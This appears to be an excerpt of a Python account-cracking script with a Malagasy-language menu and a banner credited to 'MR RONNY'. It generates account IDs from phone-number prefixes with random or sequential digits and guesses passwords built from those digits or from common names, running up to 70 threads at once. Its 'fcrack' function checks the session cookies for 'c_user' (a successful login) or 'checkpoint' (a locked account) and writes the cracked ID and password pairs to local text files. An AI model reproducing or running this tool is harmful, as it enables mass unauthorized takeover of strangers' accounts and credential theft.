...
--------------------------------------------------
[•] ANARANY TOMPONY KAODY      : \x1b[38;5;208mMR RONNY
[•] GITHUB     : \x1b[38;5;208mM4STERMIND1 
[•] TOOL TYPE  : \x1b[38;5;208mKAONTY TSY FANTATRA\033[1;37m
[•] STATUS     : \x1b[38;5;208mMAIMAIM-POANA\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 2.7\033[1;37m
[•]\033[1;31m FOR\033[1;36m HATERS \033[1;34mMIANDRY SY \033[1;37mMITENY
[•] Misolo isakiny 2 andro  
[•] NAMANA TSIFA
[•] MAHAZOA BETSAKA EHH!
--------------------------------------------------             
 """
...
cps = []
try:
    print('\n\033[1;37m[•] MIANDRY FIZARANA VAOVAO')
...
except:print('\n\033[1;31mTapaka connection anao ... \033[0;97m')
...
def menu():
	...
	if opt =='1':
		...
		print('\n\033[1;37m[•] Safidio Ny Marina\033[0;97m')
		time.sleep(2)
		menu()
...
def svn_digit():
	...
	lines()
	kode = input('[•]\033[1;37m AMPIDIRO NY KAODY : ')
	os.system('clear')
	print(logo)
	print('[•] LIMIT AMBONY [50000]')
	lines()
	limit = int(input('[•] LIMITINAO :  '))
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('\033[1;37m[•] SAFIDIO METAODY : \033[1;32mLAST 7 DIGIT')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
...
def ali_khan():
	...
	print('[•] OHATRA :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[•]\033[1;37m SAFIDIO KAODY : ')
	os.system('clear')
	print(logo)
	print('[•] LIMIT AMBONY [50000]')
	lines()
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTALINY KAONTY   : \033[1;32m'+tl)
		print('\033[1;37m[•] SAFIDIO KAODY     : \033[1;32m'+kode)
		print('\033[1;37m[•] SAFIDIO METAODY : \033[1;32mALI + KHAN')
		lines()
		for guru in user:
			uid = kode+guru
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTALINY KAONTY    : \033[1;32m'+tl)
		print('\033[1;37m[•] SAFIDIO KAODY     : \033[1;32m'+kode)
		print('\033[1;37m[•] SAFIDIO METAODY : \033[1;32mMALIK + BALOCH')
		lines()
		for guru in user:
			uid = kode+guru
...
def bd():
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('[•] TOTATINY  KAONTY   : \033[1;32m'+tl)
		print('\033[1;37m[•] SAFIDIO KAODY    : \033[1;32m'+kode)
...
def chos():
    ...
    lines()
    code = input(' NY KAODINAO : ')
    lines()
    os.system('clear')
    print(logo)
    print('[•] LIMIT AMBONY [1000]')
    lines()
    limit = int(input('[•] LIMITINAO :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
    ...
    lines()
    passx = int(input("[•] FIRY TENY MIAFINA ANAO? : "))
    SIALZADA = []
    os.system('clear')
    print(logo)
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RONNY-XD-VELONA] '+cid+' | '+ps+'\x1b[1;97m')
                open('RONNY-XD-VELONA.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[RONNY-XD-MATY] '+uid+' | '+ps+'\x1b[1;97m')
                open('RONNY-XD-MATY.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
